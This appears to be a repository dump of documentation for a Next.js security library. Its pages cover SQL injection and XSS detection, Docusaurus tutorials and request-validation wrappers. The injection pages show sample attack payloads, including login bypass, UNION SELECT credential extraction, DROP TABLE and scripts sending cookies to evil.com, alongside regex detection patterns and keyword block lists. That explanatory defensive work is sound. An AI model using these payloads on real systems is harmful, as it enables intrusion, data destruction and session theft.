+FILE: docs/modules/injection/sql-injection.md
+================================================
+# SQL Injection Protection
+
+## Overview
+
+SQL injection protection detects and blocks malicious SQL code in request payloads that could manipulate database queries and compromise data security.
+
+## Why This Is Important
+
+### The Problem: SQL Injection Attacks
+
+Attackers inject SQL code into inputs to manipulate database queries:
+
+#### 1. **Authentication Bypass*
+```javascript
+// Login form payload
+{
+  "username": "admin' OR '1'='1",
+  "password": "anything"
+}
+
+// Without protection, query becomes:
+SELECT * FROM users 
+WHERE username = 'admin' OR '1'='1' 
+AND password = 'anything'
+
+// Result: '1'='1' is always true
+// Attacker logs in without knowing password
+```
+
+**What Happens Without Protection:**
+- Authentication completely bypassed
+- Any account accessible
+- No password needed
+
+**Impact:**
+- Complete authentication bypass
+- Account takeover
+- Unauthorized data access
+- Financial fraud
+
+#### 2. **Data Extraction (UNION SELECT)**
+
+```javascript
+// Search query payload
+{
+  "search": "product' UNION SELECT username, password FROM users--"
+}
+
+// Without protection, query becomes:
+SELECT name, price FROM products 
+WHERE name = 'product' UNION SELECT username, password FROM users--'
+
+// Result: Returns all usernames and passwords
+```
+
+**What Happens Without Protection:**
+- Database schema revealed
+- User credentials stolen
+- Sensitive data exposed
+
+**Impact:**
+- Complete database dump
+- Password theft
+- Payment information stolen
+- User data breach
+
+#### 3. **Data Destruction (DROP TABLE)**
+
+```javascript
+// Delete product payload
+{
+  "productId": "123'; DROP TABLE products--"
+}
+
+// Without protection, query becomes:
+DELETE FROM products WHERE id = '123'; DROP TABLE products--'
+
+// Result: Entire products table deleted
+```
+
+**What Happens Without Protection:**
+- Critical tables dropped
+- Data permanently deleted
+- Application breaks completely
+
+**Impact:**
+- Data destruction
+- Permanent data loss
+- Business disruption
+- Revenue loss
+
+#### 4. **SQL Keyword Density Attack**
+
+```javascript
+// Sophisticated payload using many SQL keywords
+{
+  "query": "SELECT * FROM users WHERE id = 1 AND role = 'admin' OR status = 'active' JOIN permissions ON users.id = permissions.user_id"
+}
+
+// High concentration of SQL keywords indicates injection attempt
+// Keywords: SELECT, FROM, WHERE, AND, OR, JOIN, ON
+```
+
+**What Happens Without Protection:**
+- Complex injection succeeds
+- Multiple tables queried
+- Privileged data accessed
+
+**Impact:**
+- Targeted data extraction
+- Privilege escalation
+- Multi-table data theft
+
+## How nextjs-fortress Solves This
+
+### Detection Methods
+
+#### 1. **Pattern Matching**
+
+```typescript
+export const SQL_PATTERNS = [
+  /(\bUNION\b.*\bSELECT\b)/gi,      // UNION SELECT
+  /(\bINSERT\b.*\bINTO\b)/gi,       // INSERT INTO
+  /(\bDELETE\b.*\bFROM\b)/gi,       // DELETE FROM
+  /(\bDROP\b.*\bTABLE\b)/gi,        // DROP TABLE
+  /(\bUPDATE\b.*\bSET\b)/gi,        // UPDATE SET
+  /(\bEXEC(UTE)?\b)/gi,             // EXEC/EXECUTE
+  /(\bSELECT\b.*\bFROM\b)/gi,       // SELECT FROM
+  /(;\s*--)/g,                       // Comment injection
+  /('|" \s*OR\s*'1'\s*=\s*'1)/gi,   // OR 1=1
+  /(\bOR\b.*=.*)/gi,                 // OR conditions
+  /(\bAND\b.*=.*)/gi,                // AND conditions
+];
+```
+
+#### 2. **Keyword Density Analysis**
+
+```typescript
+/**
+ * Check SQL keyword density (high density = likely injection)
+ */
+private checkSQLKeywordDensity(str: string): ValidationResult {
+  const words = str.toUpperCase().split(/\s+/);
+  const keywordCount = words.filter(word => 
+    SQL_KEYWORDS.includes(word)
+  ).length;
+  
+  const density = words.length > 0 ? keywordCount / words.length : 0;
+
+  // If more than 30% of words are SQL keywords, flag it
+  if (density > 0.3 && keywordCount >= 3) {
+    return {
+      valid: false,
+      severity: 'high',
+      message: `High SQL keyword density detected (${(density * 100).toFixed(0)}%)`,
+      rule: 'sql_keyword_density',
+      confidence: Math.min(density * 2, 1),
+    };
+  }
+
+  return { valid: true };
+}
+```
+
+#### 3. **Recursive Inspection**
+
+```typescript
+/**
+ * Extract all strings from input (including nested objects)
+ */
+private extractStrings(input: unknown, depth: number = 0): string[] {
+  const strings: string[] = [];
+  const maxDepth = 10;
+
+  if (depth > maxDepth) return strings;
+
+  if (typeof input === 'string') {
+    strings.push(input);
+  } else if (Array.isArray(input)) {
+    for (const item of input) {
+      strings.push(...this.extractStrings(item, depth + 1));
+    }
+  } else if (input !== null && typeof input === 'object') {
+    for (const value of Object.values(input)) {
+      strings.push(...this.extractStrings(value, depth + 1));
+    }
+  }
+
+  return strings;
+}
+```
+
+## Attack Examples
+
+### Example 1: Login Bypass
+
+```javascript
+// Attacker login attempt
+POST /api/auth/login
+{
+  "username": "admin' OR '1'='1'--",
+  "password": "irrelevant"
+}
+
+// Fortress detects:
+// Pattern match: "OR '1'='1'" found
+// Severity: critical
+// Result: BLOCKED 
+// Message: "SQL injection detected: OR '1'='1'"
+```
+
+### Example 2: Data Extraction
+
+```javascript
+// Attacker search request
+POST /api/products/search
+{
+  "query": "laptop' UNION SELECT email, password FROM users--"
+}
+
+// Fortress detects:
+// Pattern match: "UNION SELECT" found
+// Severity: critical
+// Result: BLOCKED 
+```
+
+### Example 3: Table Deletion
+
+```javascript
+// Attacker delete request
+DELETE /api/product/123
+{
+  "id": "123'; DROP TABLE products; --"
+}
+
+// Fortress detects:
+// Pattern match: "DROP TABLE" found
+// Severity: critical
+// Result: BLOCKED 
+```
+
+### Example 4: Comment Injection
+
+```javascript
+// Attacker comment injection
+POST /api/comment
+{
+  "text": "Nice product'; DELETE FROM comments WHERE '1'='1"
+}
+
+// Fortress detects:
+// Pattern match: "DELETE FROM" found
+// Severity: critical
+// Result: BLOCKED 
+```
+
+## SQL Keywords Monitored
+
+```typescript
+export const SQL_KEYWORDS = [
+  'SELECT', 'FROM', 'WHERE', 'INSERT', 'UPDATE',
+  'DELETE', 'UNION', 'JOIN', 'DROP', 'CREATE',
+  'ALTER', 'TABLE', 'DATABASE', 'EXEC', 'EXECUTE',
+  'AND', 'OR',
+];
+```
+
+## How to Initialize
+
+```typescript
+import { FortressConfig, FortressLogger } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+
+  modules: {
+    injection: {
+      enabled: true,
+      checks: ['sql'],
+      
+      // Optional: Add custom SQL patterns
+      customPatterns: [
+        /\bTRUNCATE\b/gi,
+        /\bALTER\b/gi,
+      ],
+    },
+  },
+
+  onSecurityEvent: async (event) => {
+    if (event.detection.rule === 'sql_injection') {
+      const logger = new FortressLogger({
+        enabled: true,
+        level: 'warn',
+        destination: 'console',
+      });
+
+      logger.warn('ðŸš¨ SQL Injection Attempt', {
+        pattern: event.detection.pattern,
+        ip: event.request.ip,
+        path: event.request.path,
+      });
+    }
+  },
+};
+```
+
+## Summary
+
+**What happens without SQL injection protection:**
+- Authentication bypass
+- Data theft
+- Database destruction
+- Complete compromise
+
+**What nextjs-fortress provides:**
+- Pattern-based detection
+- Keyword density analysis
+- Recursive payload scanning
+- Custom pattern support
+
+**How to initialize:**
+```typescript
+injection: {
+  enabled: true,
+  checks: ['sql'],  // Enable SQL injection detection
+}
+```
+
+---
+
+**Related Documentation:**
+- [Command Injection Protection](./command-injection.md)
+- [XSS Protection](./xss-protection.md)
+- [Code Injection Protection](./code-injection.md)
+
+
+================================================
+FILE: docs/modules/injection/xss-protection.md
+================================================
+# XSS Protection (Cross-Site Scripting)
+
+## Overview
+
+XSS protection detects and blocks malicious JavaScript code in payloads that could be executed in users' browsers to steal data, hijack sessions, or deface applications.
+
+## Why This Is Important
+
+### The Problem: Cross-Site Scripting Attacks
+
+Attackers inject malicious scripts that execute in victims' browsers:
+
+#### 1. **Script Tag Injection**
+
+```javascript
+// Attacker comment on blog
+{
+  "comment": "<script>alert(document.cookie)</script>"
+}
+
+// Without protection:
+// Comment stored in database
+// When page loads: <div>{comment}</div>
+// Script executes: alert(document.cookie)
+// Attacker steals session cookies
+```
+
+**What Happens Without Protection:**
+- Malicious script stored
+- Executes in all users' browsers
+- Session cookies stolen
+- Users' accounts compromised
+
+**Impact:** Session hijacking Account takeover Data theft Identity impersonation
+
+#### 2. **Event Handler Injection**
+
+```javascript
+// Attacker profile update
+{
+  "avatar": "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"
+}
+
+// Without protection:
+// Renders: <img src=x onerror='...'>
+// Browser triggers onerror
+// Sends cookies to attacker's server
+```
+
+**What Happens Without Protection:**
+- Event handlers execute JavaScript
+- Data exfiltrated silently
+- User unaware of attack
+
+**Impact:**
+- Silent data theft
+- Stealth attacks
+- Data exfiltration
+- Targeted attacks
+
+#### 3. **JavaScript Protocol**
+
+```javascript
+// Attacker malicious link
+{
+  "website": "javascript:void(window.location='https://evil.com?cookie='+document.cookie)"
+}
+
+// Without protection:
+// Renders: <a href="javascript:...">Click here</a>
+// User clicks link
+// JavaScript executes
+// Redirected with stolen cookies
+```
+
+**What Happens Without Protection:**
+- Links execute JavaScript
+- Victims tricked into clicking
+- Credentials stolen
+
+**Impact:**
+- Phishing attacks
+- Malicious redirects
+- Cookie theft
+- Credential harvesting
+
+#### 4. **iFrame Injection**
+
+```javascript
+// Attacker embeds malicious iframe
+{
+  "content": "<iframe src='https://evil.com/keylogger'></iframe>"
+}
+
+// Without protection:
+// Iframe loads malicious page
+// Keylogger captures all input
+// Sends to attacker's server
+```
+
+**What Happens Without Protection:**
+- Malicious content embedded
+- Keyloggers capture input
+- All user actions monitored
+
+**Impact:**
+- Keystroke logging
+- Password capture
+- Form data theft
+- Persistent monitoring
+
+## How nextjs-fortress Solves This
+
+### Detection Patterns
+
+```typescript
+export const XSS_PATTERNS = [
+  /<script[^>]*>.*<\/script>/gi,           // Script tags
+  /on\w+\s*=\s*["']?[^"']*["']?/gi,        // Event handlers (onclick, onerror, etc.)
+  /javascript:/gi,                          // JavaScript protocol
+  /<iframe[^>]*>/gi,                        // iFrames
+  /<object[^>]*>/gi,                        // Object tags
+  /<embed[^>]*>/gi,                         // Embed tags
+  /<img[^>]*onerror/gi,                     // Image onerror
+  /eval\s*\(/gi,                            // eval() calls
+  /expression\s*\(/gi,                      // CSS expression
+  /vbscript:/gi,                            // VBScript protocol
+  /data:text\/html/gi,                      // Data URIs with HTML
+];
+```
+
+### The Algorithm
+
+```typescript
+/**
+ * Check a string against XSS patterns
+ */
+private checkPatterns(
+  str: string,
+  patterns: RegExp[],
+  type: string
+): ValidationResult {
+  for (const pattern of patterns) {
+    pattern.lastIndex = 0; // Reset regex state
+    const match = pattern.exec(str);
+
+    if (match) {
+      return {
+        valid: false,
+        severity: 'high',
+        message: `XSS injection detected: "${match[0]}"`,
+        rule: 'xss_injection',
+        pattern: match[0],
+        confidence: 0.9,
+      };
+    }
+  }
+
+  return { valid: true };
+}
+```
+
+## Attack Examples
+
+### Example 1: Cookie Theft
+
+```javascript
+// Attacker comment
+POST /api/comments
+{
+  "text": "<script>fetch('https://evil.com?c='+document.cookie)</script>"
+}
+
+// Fortress detects:
+// Pattern match: "<script>" found
+// Severity: high
+// Result: BLOCKED âœ…
+```
+
+### Example 2: Event Handler Attack
+
+```javascript
+// Attacker profile picture
+POST /api/user/avatar
+{
+  "url": "<img src=x onerror=alert('XSS')>"
+}
+
+// Fortress detects:
+// Pattern match: "onerror=" found
+// Result: BLOCKED âœ…
+```
+
+### Example 3: JavaScript URL
+
+```javascript
+// Attacker malicious link
+POST /api/post
+{
+  "link": "javascript:alert(document.cookie)"
+}
+
+// Fortress detects:
+// Pattern match: "javascript:" found
+// Result: BLOCKED âœ…
+```
+
+### Example 4: iFrame Embedding
+
+```javascript
+// Attacker embed malicious site
+POST /api/content
+{
+  "html": "<iframe src='https://evil.com/phishing'></iframe>"
+}
+
+// Fortress detects:
+// Pattern match: "<iframe" found
+// Result: BLOCKED âœ…
+```
+
+## How to Initialize
+
+```typescript
+import { FortressConfig, FortressLogger } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+
+  modules: {
+    injection: {
+      enabled: true,
+      checks: ['xss'],
+    },
+  },
+
+  onSecurityEvent: async (event) => {
+    if (event.detection.rule === 'xss_injection') {
+      const logger = new FortressLogger({
+        enabled: true,
+        level: 'warn',
+        destination: 'console',
+      });
+
+      logger.warn('ðŸš¨ XSS Attack Blocked', {
+        pattern: event.detection.pattern,
+        ip: event.request.ip,
+        path: event.request.path,
+      });
+    }
+  },
+};
+```
+
+## Summary
+
+**What happens without XSS protection:**
+- Session hijacking
+- Cookie theft
+- Account takeover
+- Data exfiltration
+
+**What nextjs-fortress provides:**
+- Script tag detection
+- Event handler blocking
+- Protocol validation
+- iFrame prevention
+
+**How to initialize:**
+```typescript
+injection: {
+  enabled: true,
+  checks: ['xss'],
+}
+```
+
+---
+
+**Related Documentation:**
+- [SQL Injection Protection](./sql-injection.md)
+- [Command Injection Protection](./command-injection.md)
+- [Code Injection Protection](./code-injection.md)
+
+
+================================================
+FILE: docs/modules/rate-limit/rate-limiting.md
+================================================
+Error reading file with 'cp1252': 'charmap' codec can't decode byte 0x9d in position 6038: character maps to <undefined>
+
+
+================================================
+FILE: docs/tutorial-extras/_category_.json
+================================================
+{
+  "label": "Tutorial - Extras",
+  "position": 3,
+  "link": {
+    "type": "generated-index"
+  }
+}
+
+
+
+================================================
+FILE: docs/tutorial-extras/manage-docs-versions.md
+================================================
+---
+sidebar_position: 1
+---
+
+# Manage Docs Versions
+
+Docusaurus can manage multiple versions of your docs.
+
+## Create a docs version
+
+Release a version 1.0 of your project:
+
+```bash
+npm run docusaurus docs:version 1.0
+```
+
+The `docs` folder is copied into `versioned_docs/version-1.0` and `versions.json` is created.
+
+Your docs now have 2 versions:
+
+- `1.0` at `http://localhost:3000/docs/` for the version 1.0 docs
+- `current` at `http://localhost:3000/docs/next/` for the **upcoming, unreleased docs**
+
+## Add a Version Dropdown
+
+To navigate seamlessly across versions, add a version dropdown.
+
+Modify the `docusaurus.config.js` file:
+
+```js title="docusaurus.config.js"
+export default {
+  themeConfig: {
+    navbar: {
+      items: [
+        // highlight-start
+        {
+          type: 'docsVersionDropdown',
+        },
+        // highlight-end
+      ],
+    },
+  },
+};
+```
+
+The docs version dropdown appears in your navbar:
+
+![Docs Version Dropdown](./img/docsVersionDropdown.png)
+
+## Update an existing version
+
+It is possible to edit versioned docs in their respective folder:
+
+- `versioned_docs/version-1.0/hello.md` updates `http://localhost:3000/docs/hello`
+- `docs/hello.md` updates `http://localhost:3000/docs/next/hello`
+
+
+
+================================================
+FILE: docs/tutorial-extras/translate-your-site.md
+================================================
+---
+sidebar_position: 2
+---
+
+# Translate your site
+
+Let's translate `docs/intro.md` to French.
+
+## Configure i18n
+
+Modify `docusaurus.config.js` to add support for the `fr` locale:
+
+```js title="docusaurus.config.js"
+export default {
+  i18n: {
+    defaultLocale: 'en',
+    locales: ['en', 'fr'],
+  },
+};
+```
+
+## Translate a doc
+
+Copy the `docs/intro.md` file to the `i18n/fr` folder:
+
+```bash
+mkdir -p i18n/fr/docusaurus-plugin-content-docs/current/
+
+cp docs/intro.md i18n/fr/docusaurus-plugin-content-docs/current/intro.md
+```
+
+Translate `i18n/fr/docusaurus-plugin-content-docs/current/intro.md` in French.
+
+## Start your localized site
+
+Start your site on the French locale:
+
+```bash
+npm run start -- --locale fr
+```
+
+Your localized site is accessible at [http://localhost:3000/fr/](http://localhost:3000/fr/) and the `Getting Started` page is translated.
+
+:::caution
+
+In development, you can only use one locale at a time.
+
+:::
+
+## Add a Locale Dropdown
+
+To navigate seamlessly across languages, add a locale dropdown.
+
+Modify the `docusaurus.config.js` file:
+
+```js title="docusaurus.config.js"
+export default {
+  themeConfig: {
+    navbar: {
+      items: [
+        // highlight-start
+        {
+          type: 'localeDropdown',
+        },
+        // highlight-end
+      ],
+    },
+  },
+};
+```
+
+The locale dropdown now appears in your navbar:
+
+![Locale Dropdown](./img/localeDropdown.png)
+
+## Build your localized site
+
+Build your site for a specific locale:
+
+```bash
+npm run build -- --locale fr
+```
+
+Or build your site to include all the locales at once:
+
+```bash
+npm run build
+```
+
+
+
+================================================
+FILE: docs/wrappers/api-route.md
+================================================
+# API Routes Wrapper
+
+## Overview
+
+The API Routes wrapper (`withFortress`) provides route-level security validation for Next.js API Routes with custom configuration per endpoint.
+
+## Why Use the Wrapper
+
+While middleware protects all routes globally, the wrapper allows:
+
+- **Custom rate limits** per endpoint
+- **CSRF validation** for specific routes
+- **Custom payload limits** per endpoint
+- **Method restrictions** per route
+- **Encoding validation toggle** per endpoint
+
+## Implementation
+
+```typescript
+/**
+ * Create a secure API route wrapper
+ */
+export function createWithFortress(config: FortressConfig) {
+  const logger = new FortressLogger(config.logging);
+  const deserializationValidator = createDeserializationValidator(
+    config.modules.deserialization
+  );
+  const injectionValidator = createInjectionValidator(config.modules.injection);
+  const csrfValidator = config.modules.csrf.enabled
+    ? createCSRFValidator(config.modules.csrf)
+    : null;
+  const encodingValidator = createEncodingValidator(config.modules.encoding);
+
+  return function withFortress(
+    handler: (request: NextRequest) => Promise<Response>,
+    options: SecureRouteOptions = {}
+  ) {
+    return async function securedHandler(
+      request: NextRequest
+    ): Promise<Response> {
+      // 1. Check allowed methods
+      if (options.allowedMethods) {
+        if (!options.allowedMethods.includes(request.method)) {
+          return new NextResponse('Method Not Allowed', { status: 405 });
+        }
+      }
+
+      // 2. Rate limiting (if specified)
+      if (options.rateLimit) {
+        const rateLimitResult = checkRateLimit(request, options.rateLimit);
+        if (!rateLimitResult.allowed) {
+          return new NextResponse('Too Many Requests', {
+            status: 429,
+            headers: {
+              'Retry-After': String(
+                Math.ceil(rateLimitResult.retryAfter / 1000)
+              ),
+            },
+          });
+        }
+      }
+
+      // 3. Payload size check
+      const contentLength = request.headers.get('content-length');
+      const maxSize =
+        options.maxPayloadSize || config.modules.content.maxPayloadSize;
+
+      if (contentLength && parseInt(contentLength) > maxSize) {
+        return new NextResponse('Payload Too Large', { status: 413 });
+      }
+
+      // 4. Encoding validation
+      if (
+        options.validateEncoding !== false &&
+        config.modules.encoding.enabled
+      ) {
+        const contentType = request.headers.get('content-type');
+        const body = await request.clone().arrayBuffer();
+
+        const encodingResult = await encodingValidator.validate(
+          contentType,
+          body
+        );
+        if (!encodingResult.valid) {
+          return new NextResponse('Bad Request: Invalid Encoding', {
+            status: 400,
+          });
+        }
+      }
+
+      // 5. Parse and validate request body
+      if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
+        const validationResult = await validateRequestBody(
+          request,
+          deserializationValidator,
+          injectionValidator,
+          config
+        );
+
+        if (!validationResult.valid) {
+          return new NextResponse('Forbidden', { status: 403 });
+        }
+      }
+
+      // 6. CSRF validation (if required)
+      if (options.requireCSRF && csrfValidator) {
+        const csrfToken =
+          request.headers.get(csrfValidator.getHeaderName()) ||
+          request.cookies.get(csrfValidator.getCookieName())?.value;
+
+        const sessionId = request.cookies.get('session')?.value || 'default';
+
+        const csrfResult = await csrfValidator.validate(
+          csrfToken,
+          sessionId,
+          request.method
+        );
+        if (!csrfResult.valid) {
+          return new NextResponse('Forbidden: Invalid CSRF Token', {
+            status: 403,
+          });
+        }
+      }
+
+      // Execute the original handler
+      return await handler(request);
+    };
+  };
+}
+```
+
+## Basic Usage
+
+### Setup
+
+```typescript
+// fortress.config.ts
+import { FortressConfig } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+  // ... your config
+};
+
+// lib/fortress.ts
+import { createWithFortress } from '@mindfiredigital/nextjs-fortress';
+import { fortressConfig } from '../fortress.config';
+
+export const withFortress = createWithFortress(fortressConfig);
+```
+
+### Simple Protection
+
+```typescript
+// app/api/user/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const POST = withFortress(async (request) => {
+  const data = await request.json();
+  
+  // Data already validated:
+  // âœ“ No prototype pollution
+  // âœ“ No SQL injection
+  // âœ“ No XSS
+  // âœ“ Valid encoding
+  
+  await updateUser(data);
+  return Response.json({ success: true });
+});
+```
+
+## Advanced Configuration
+
+### Custom Rate Limit
+
+```typescript
+// app/api/auth/login/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const POST = withFortress(
+  async (request) => {
+    const { username, password } = await request.json();
+    const user = await authenticateUser(username, password);
+    return Response.json({ success: true, user });
+  },
+  {
+    rateLimit: {
+      requests: 5,       // Only 5 attempts
+      window: 300000,    // Per 5 minutes
+    },
+  }
+);
+```
+
+### Method Restrictions
+
+```typescript
+// app/api/data/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const handler = withFortress(
+  async (request) => {
+    if (request.method === 'GET') {
+      return Response.json(await getData());
+    }
+    
+    if (request.method === 'POST') {
+      const data = await request.json();
+      return Response.json(await createData(data));
+    }
+  },
+  {
+    allowedMethods: ['GET', 'POST'], // Only these methods
+  }
+);
+
+export { handler as GET, handler as POST };
+```
+
+### Custom Payload Size
+
+```typescript
+// app/api/upload/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const POST = withFortress(
+  async (request) => {
+    const formData = await request.formData();
+    const file = formData.get('file');
+    return Response.json({ success: true });
+  },
+  {
+    maxPayloadSize: 10 * 1024 * 1024, // 10MB for file uploads
+  }
+);
+```
+
+### CSRF Protection
+
+```typescript
+// app/api/account/delete/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const POST = withFortress(
+  async (request) => {
+    const { userId } = await request.json();
+    await deleteAccount(userId);
+    return Response.json({ success: true });
+  },
+  {
+    requireCSRF: true, // Require valid CSRF token
+  }
+);
+```
+
+### Disable Encoding Validation
+
+```typescript
+// app/api/webhook/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const POST = withFortress(
+  async (request) => {
+    // Handle webhook from third-party
+    const data = await request.text();
+    return Response.json({ received: true });
+  },
+  {
+    validateEncoding: false, // Skip encoding check for webhooks
+  }
+);
+```
+
+### Combined Options
+
+```typescript
+// app/api/admin/users/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const POST = withFortress(
+  async (request) => {
+    const data = await request.json();
+    await createUser(data);
+    return Response.json({ success: true });
+  },
+  {
+    requireCSRF: true,
+    allowedMethods: ['POST'],
+    rateLimit: {
+      requests: 10,
+      window: 60000,
+    },
+    maxPayloadSize: 50 * 1024, // 50KB
+  }
+);
+```
+
+## Options Reference
+
+```typescript
+interface SecureRouteOptions {
+  // Require CSRF token validation
+  requireCSRF?: boolean;
+  
+  // Custom rate limit for this endpoint
+  rateLimit?: {
+    requests: number;
+    window: number; // milliseconds
+  };
+  
+  // Maximum payload size
+  maxPayloadSize?: number;
+  
+  // Allowed HTTP methods
+  allowedMethods?: string[];
+  
+  // Enable/disable encoding validation
+  validateEncoding?: boolean;
+}
+```
+
+## Real-World Examples
+
+### E-Commerce Checkout
+
+```typescript
+// app/api/checkout/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const POST = withFortress(
+  async (request) => {
+    const order = await request.json();
+    
+    // Validated data - safe to process
+    const result = await processPayment(order);
+    
+    return Response.json(result);
+  },
+  {
+    requireCSRF: true,           // Prevent CSRF
+    maxPayloadSize: 100 * 1024,  // 100KB max
+    rateLimit: {
+      requests: 3,               // 3 checkouts
+      window: 60000,             // per minute
+    },
+  }
+);
+```
+
+### User Registration
+
+```typescript
+// app/api/auth/register/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const POST = withFortress(
+  async (request) => {
+    const userData = await request.json();
+    
+    // Already validated:
+    // - No prototype pollution
+    // - No SQL injection in fields
+    // - No XSS in inputs
+    
+    const user = await createUser(userData);
+    return Response.json({ success: true, user });
+  },
+  {
+    rateLimit: {
+      requests: 5,      // 5 registrations
+      window: 3600000,  // per hour
+    },
+    maxPayloadSize: 10 * 1024, // Small registration data
+  }
+);
+```
+
+### Admin API
+
+```typescript
+// app/api/admin/settings/route.ts
+import { withFortress } from '@/lib/fortress';
+
+export const POST = withFortress(
+  async (request) => {
+    const settings = await request.json();
+    await updateSettings(settings);
+    return Response.json({ success: true });
+  },
+  {
+    requireCSRF: true,           // Critical - require CSRF
+    allowedMethods: ['POST'],    // Only POST
+    rateLimit: {
+      requests: 20,
+      window: 60000,
+    },
+  }
+);
+```
+
+## Error Responses
+
+### Method Not Allowed
+
+```typescript
+// Request: DELETE /api/user
+// Response:
+Status: 405 Method Not Allowed
+```
+
+### Rate Limit Exceeded
+
+```typescript
+// Response:
+Status: 429 Too Many Requests
+Retry-After: 45
+
+// Headers indicate when to retry
+```
+
+### Payload Too Large
+
+```typescript
+// Response:
+Status: 413 Payload Too Large
+```
+
+### Invalid Encoding
+
+```typescript
+// Response:
+Status: 400 Bad Request
+Body: "Bad Request: Invalid Encoding"
+```
+
+### Validation Failed
+
+```typescript
+// Response:
+Status: 403 Forbidden
+```
+
+### CSRF Invalid
+
+```typescript
+// Response:
+Status: 403 Forbidden
+Body: "Forbidden: Invalid CSRF Token"
+```
+
+## Summary
+
+**withFortress wrapper provides:**
+- Route-level protection
+- Custom rate limits
+- CSRF validation
+- Method restrictions
+- Payload size limits
+- Encoding validation
+
+**How to use:**
+```typescript
+export const POST = withFortress(
+  async (request) => {
+    // Your handler
+  },
+  {
+    requireCSRF: true,
+    rateLimit: { requests: 10, window: 60000 },
+  }
+);
+```
+
+---
+
+**Related Documentation:**
+- [Server Actions Wrapper](./server-action.md)
+- [Rate Limiting](../modules/rate-limit/rate-limiting.md)
+
+
+================================================
+FILE: docs/wrappers/server-action.md
+================================================
+# Server Actions Wrapper
+
+## Overview
+
+The Server Actions wrapper (`secureServerAction`) protects Next.js Server Actions from prototype pollution, injection attacks, and validates all input arguments automatically.
+
+## Why Use the Wrapper
+
+Server Actions are particularly vulnerable because:
+- Data comes directly from forms
+- No URL-based routing protection
+- Arguments passed directly to functions
+- Easy to forget validation
+
+The wrapper provides:
+- **Automatic argument validation**
+- **Input sanitization**
+- **CSRF protection**
+- **Prototype pollution prevention**
+- **Injection detection**
+
+## Implementation
+
+```typescript
+/**
+ * Create a secure server action wrapper
+ */
+export function createSecureServerAction(config: FortressConfig) {
+  const logger = new FortressLogger(config.logging);
+  const deserializationValidator = createDeserializationValidator(
+    config.modules.deserialization
+  );
+  const injectionValidator = createInjectionValidator(config.modules.injection);
+  const csrfValidator = config.modules.csrf.enabled
+    ? createCSRFValidator(config.modules.csrf)
+    : null;
+
+  return function secureServerAction<TArgs extends unknown[], TReturn>(
+    action: (...args: TArgs) => Promise<TReturn>,
+    options: SecureActionOptions = {}
+  ) {
+    return async function securedAction(...args: TArgs): Promise<TReturn> {
+      // 1. Validate deserialization
+      if (config.modules.deserialization.enabled) {
+        for (const arg of args) {
+          const result = deserializationValidator.validate(arg);
+          if (!result.valid) {
+            logger.warn(`Server action blocked: ${result.message}`);
+            throw new SecurityError(
+              result.message || 'Invalid input detected',
+              result.rule || 'deserialization'
+            );
+          }
+        }
+      }
+
+      // 2. Validate injection
+      if (config.modules.injection.enabled) {
+        for (const arg of args) {
+          const result = injectionValidator.validate(arg);
+          if (!result.valid) {
+            logger.warn(
+              `Injection attempt in server action: ${result.message}`
+            );
+            throw new SecurityError(
+              result.message || 'Injection detected',
+              result.rule || 'injection'
+            );
+          }
+        }
+      }
+
+      // 3. CSRF validation (if required)
+      if (options.requireCSRF && csrfValidator) {
+        const csrfToken = extractCSRFToken(args);
+        const sessionId = extractSessionId(args);
+
+        const result = await csrfValidator.validate(
+          csrfToken,
+          sessionId,
+          'POST'
+        );
+        if (!result.valid) {
+          logger.warn(`CSRF validation failed: ${result.message}`);
+          throw new SecurityError(
+            result.message || 'CSRF validation failed',
+            result.rule || 'csrf'
+          );
+        }
+      }
+
+      // 4. Sanitize inputs if requested
+      let sanitizedArgs = args;
+      if (options.sanitizeInputs) {
+        sanitizedArgs = sanitizeInputs(args) as TArgs;
+      }
+
+      // Execute the original action with sanitized inputs
+      return await action(...sanitizedArgs);
+    };
+  };
+}
+```
+
+## Basic Usage
+
+### Setup
+
+```typescript
+// fortress.config.ts
+import { FortressConfig } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+  // ... your config
+};
+
+// lib/fortress.ts
+import { createSecureServerAction } from '@mindfiredigital/nextjs-fortress';
+import { fortressConfig } from '../fortress.config';
+
+export const secureServerAction = createSecureServerAction(fortressConfig);
+```
+
+### Simple Protection
+
+```typescript
+// app/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+
+export const updateProfile = secureServerAction(
+  async (userId: string, profile: ProfileData) => {
+    // All arguments validated:
+    // âœ“ No prototype pollution
+    // âœ“ No SQL injection
+    // âœ“ No XSS
+    
+    await db.profiles.update(userId, profile);
+    return { success: true };
+  }
+);
+```
+
+## Advanced Configuration
+
+### With Input Sanitization
+
+```typescript
+// app/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+
+export const createPost = secureServerAction(
+  async (title: string, content: string) => {
+    // Inputs sanitized:
+    // - __proto__ removed
+    // - constructor removed
+    // - prototype removed
+    
+    const post = await db.posts.create({ title, content });
+    return { success: true, post };
+  },
+  {
+    sanitizeInputs: true, // Remove dangerous keys
+  }
+);
+```
+
+### With CSRF Protection
+
+```typescript
+// app/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+
+export const deleteAccount = secureServerAction(
+  async (userId: string, metadata: ActionMetadata) => {
+    // CSRF token validated from metadata._csrf
+    await db.users.delete(userId);
+    return { success: true };
+  },
+  {
+    requireCSRF: true, // Validate CSRF token
+  }
+);
+
+// Client usage:
+interface ActionMetadata {
+  _csrf: string;
+  sessionId: string;
+}
+
+await deleteAccount(userId, {
+  _csrf: getCsrfToken(),
+  sessionId: getSessionId(),
+});
+```
+
+### With Input Restrictions
+
+```typescript
